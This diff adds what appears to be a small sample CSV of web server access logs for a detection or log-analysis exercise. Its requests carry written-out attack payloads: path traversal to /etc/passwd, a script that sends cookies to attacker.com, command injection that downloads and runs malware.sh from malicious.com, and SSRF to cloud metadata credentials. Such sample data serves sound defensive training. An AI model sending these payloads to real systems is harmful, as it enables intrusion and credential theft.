@@ -1,0 +1,14 @@
+_time,clientip,method,uri,status,bytes
+"2026-06-14T23:20:01.000+05:30",10.10.10.50,GET,/index.php,200,1024
+"2026-06-14T23:20:05.000+05:30",10.10.10.50,GET,"/index.php?page=../../../../../../../../etc/passwd",200,4048
+"2026-06-14T23:21:10.000+05:30",10.10.10.50,GET,"/search.php?query=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",200,500
+"2026-06-14T23:22:00.000+05:30",10.10.10.50,POST,"/api/ping?ip=127.0.0.1;wget http://malicious.com/malware.sh -O /tmp/malware.sh",200,800
+"2026-06-14T23:22:05.000+05:30",10.10.10.50,POST,"/api/ping?ip=127.0.0.1;chmod +x /tmp/malware.sh;/tmp/malware.sh",200,900
+"2026-06-14T23:23:00.000+05:30",10.10.10.50,GET,/fetch_image.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/,200,1500
+"2026-06-14T23:24:00.100+05:30",10.10.10.50,GET,/login.php,404,234
+"2026-06-14T23:24:00.200+05:30",10.10.10.50,GET,/login.php,404,234
+"2026-06-14T23:24:00.300+05:30",10.10.10.50,GET,/login.php,404,234
+"2026-06-14T23:24:00.400+05:30",10.10.10.50,GET,/login.php,404,234
+"2026-06-14T23:24:00.500+05:30",10.10.10.50,GET,/login.php,404,234
+"2026-06-14T23:24:00.600+05:30",10.10.10.50,GET,/login.php,404,234
+"2026-06-14T23:24:00.700+05:30",10.10.10.50,GET,/login.php,404,234
